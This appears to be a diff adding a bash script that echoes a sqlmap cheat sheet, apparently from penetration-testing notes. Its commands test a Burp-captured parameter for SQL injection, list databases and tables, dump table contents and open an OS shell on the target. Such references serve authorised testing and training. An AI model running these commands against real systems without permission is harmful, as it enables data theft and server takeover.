@@ -1,0 +1,24 @@
+#!/bin/bash
+
+echo "
+# burp.req -> request dumped from burp into a file.
+# The URL in it needs to contain the <param_to_exploit>.
+sqlmap -r burp.req -p <param_to_exploit> --batch
+
+# If it works, we can proceed...
+
+# List DB's
+sqlmap -r burp.req -p <param_to_exploit> --dbs
+
+# List tables of a DB
+sqlmap -r burp.req -p <param_to_exploit> -D <db_name> --tables
+
+# Dump table contents
+sqlmap -r burp.req -p <param_to_exploit> -D <db_name> -T <table_name> --dump
+
+# Gain OS-Shell
+sqlmap -r burp.req -p <param_to_exploit> --os-shell
+
+# If it works the following will appear
+os-shell>
+"
